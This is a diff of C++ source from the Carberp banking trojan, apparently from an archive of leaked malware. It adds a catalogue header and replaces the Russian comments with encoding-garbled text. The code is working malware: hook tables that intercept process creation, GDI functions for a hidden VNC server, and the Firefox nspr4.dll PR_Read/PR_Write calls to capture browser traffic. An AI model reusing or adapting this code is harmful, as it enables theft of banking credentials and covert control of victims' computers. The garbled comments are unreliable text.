@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <ws2tcpip.h>
@@ -40,9 +51,9 @@ void WinApiTables::uninit(void)
 }
 
 /*
-  Выбор функций для уведомлении о создании процесса.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT hwa - результат выбора.
+  OUT hwa - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 {
@@ -51,7 +62,7 @@ static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
     hwa->functionForHook = coreData.ntdllApi.ntCreateUserProcess;
     hwa->hookerFunction  = CoreHook::hookerNtCreateUserProcess;
   }
-  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //Обе функции не могут быть NULL, см. Core::init()*/
+  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ NULL, пїЅпїЅ. Core::init()*/
   {
     hwa->functionForHook = coreData.ntdllApi.ntCreateThread;
     hwa->hookerFunction  = CoreHook::hookerNtCreateThread;
@@ -59,14 +70,14 @@ static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 }
 
 /*
-  Снимает перехватыват со всеx WinApi из списка
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅx WinApi пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
+  IN process            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list           - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN count              - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return                - true - если снять перехват со всех WinApi,
-                          false - если не снят перехват хотя бы с одной WinAPI.
+  Return                - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ WinApi,
+                          false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ WinAPI.
 */
 static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
 {
@@ -96,20 +107,20 @@ static void hotPatchCallback(const void *functionForHook, const void *originalFu
 }
 
 /*
-  Перехватывает все WinApi из списка
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ WinApi пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
-  IN realCount          - кол. эелементов, должны быть равны. Смысл это понятен в коде.
+  IN process            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list           - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN count              - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN realCount          - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 
-  Return                - true - если перехвачены все WinApi,
-                          false - если не перехвачена хотя бы одна WinAPI.
+  Return                - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ WinApi,
+                          false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ WinAPI.
 */
 static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
 {
 
-  //Страхуемся.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(count != realCount)
   {
 #   if defined WDEBUG2
@@ -118,7 +129,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
     return false;
   }
 
-  //Обнуляем структуру на всякий случай.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   for(DWORD i = 0; i < count; i++)
   {
     if(list[i].functionForHook == NULL)
@@ -135,7 +146,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
   LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
   if(opcodesBuf != NULL)
   {
-    //Ставим хуки.    
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.    
     DWORD i = 0;
     for(; i < count; i++)
     {
@@ -156,7 +167,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 
     if(i == count)return true;
       
-    //Снимаем хуки.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
     unhookList(process, list, count);
   }
 
@@ -164,7 +175,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для пользовательского процесса.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 static HOOKWINAPI userHooks[] =
 {
@@ -225,7 +236,7 @@ static HOOKWINAPI userHooks[] =
   {NULL, VncServer::hookerGetDcEx,                      NULL, 0},
   {NULL, VncServer::hookerGetDc,                        NULL, 0},
   {NULL, VncServer::hookerGetWindowDc,                  NULL, 0},
-  {NULL, VncServer::hookerReleaseDс,                    NULL, 0},
+  {NULL, VncServer::hookerReleaseDпїЅ,                    NULL, 0},
   {NULL, VncServer::hookerGetUpdateRect,                NULL, 0},
   {NULL, VncServer::hookerGetUpdateRgn,                 NULL, 0},
   
@@ -333,7 +344,7 @@ bool WinApiTables::_setUserHooks(void)
 
 //  userHooks[i++].functionForHook = CWA(crypt32, PFXImportCertStore);
 
-  //Хукаем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ.
   return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
 }
 
@@ -343,7 +354,7 @@ bool WinApiTables::_removeUserHooks(void)
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для nspr4.dll.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ nspr4.dll.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 #if(BO_NSPR4 > 0)
@@ -377,7 +388,7 @@ bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
   nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Read");
   nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Write");
 
-  //Хукаем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ.
   bool ok = hookList(CURRENT_PROCESS, nspr4Hooks, i, sizeof(nspr4Hooks) / sizeof(HOOKWINAPI));
   if(ok)Nspr4Hook::updateAddresses(nspr4Handle, nspr4Hooks[0].originalFunction, nspr4Hooks[1].originalFunction, nspr4Hooks[2].originalFunction, nspr4Hooks[3].originalFunction);
 
